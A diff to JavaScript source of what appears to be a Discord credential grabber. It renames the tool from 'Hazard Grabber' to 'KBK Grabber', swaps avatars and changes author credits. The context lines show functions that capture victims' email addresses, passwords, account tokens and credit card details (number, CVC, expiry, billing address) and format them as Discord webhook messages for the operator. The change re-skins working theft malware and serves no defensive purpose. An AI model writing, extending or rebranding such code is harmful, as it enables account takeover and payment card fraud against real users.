@@ -127,12 +127,12 @@ function Login(email, password, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "KBK Grabber",
                 content: "",
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": 16711680,
                         "fields": [
                             {
                                 "name": "**Account Info**",
@@ -150,7 +150,7 @@ function Login(email, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By XPTGR#0636・https://github.com/XPTGR/Hazard-Nuker"
+                            "text": "KBK Grabber By Keiuk#0001・"
                         }
                     }
                 ]
@@ -204,7 +204,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By XPTGR#0636・https://github.com/XPTGR/Hazard-Nuker"
+                            "text": "KBK Grabber By Keiuk#0001"
                         }                 
                     }
                 ]
@@ -229,9 +229,9 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Hazard Grabber",
+                username: "Keiuk Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/917536367880335410/917536378395443290/ohdear_avatar.png",
                 embeds: [
                     {
                         "color": 16507654,
@@ -257,7 +257,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By XPTGR#0636・https://github.com/XPTGR/Hazard-Nuker"
+                            "text": "KBK Grabber By Keiuk#0001・"
                         }                
                     }
                 ]
@@ -283,9 +283,9 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "KBK Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://cdn.discordapp.com/attachments/917536367880335410/917536378395443290/ohdear_avatar.png",
                 embeds: [
                     {
                         "color": 16507654,
@@ -311,7 +311,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Hazard Grabber By XPTGR#0636・https://github.com/XPTGR/Hazard-Nuker"
+                            "text": "KBK Grabber By Keiuk#0001・"
                         }
                     }
                 ]
